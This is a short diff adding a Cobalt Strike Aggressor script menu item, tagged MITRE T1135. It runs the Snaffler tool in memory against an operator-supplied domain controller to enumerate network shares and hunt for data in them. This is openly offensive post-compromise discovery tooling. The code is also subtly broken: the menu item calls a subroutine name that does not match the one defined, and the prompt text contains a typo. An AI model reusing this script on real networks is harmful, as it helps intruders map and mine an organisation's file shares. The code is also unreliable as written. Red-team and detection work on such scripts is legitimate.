@@ -1,0 +1,17 @@
+########################
+#Find Shares - User Enumeration Specify Domain Controller
+########################
+item "Snaffler - Display All User Available Shares Based On Domain Controller - T1135"{
+
+    local('$bid');
+        foreach $bid ($1){
+            finddomaincontrollershares($bid);
+      }
+   }
+   
+   
+sub finduserdomaincontrollershares{
+prompt_text("Insert DomanController", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $1 -v data");
+}, $bids => $1));
+}
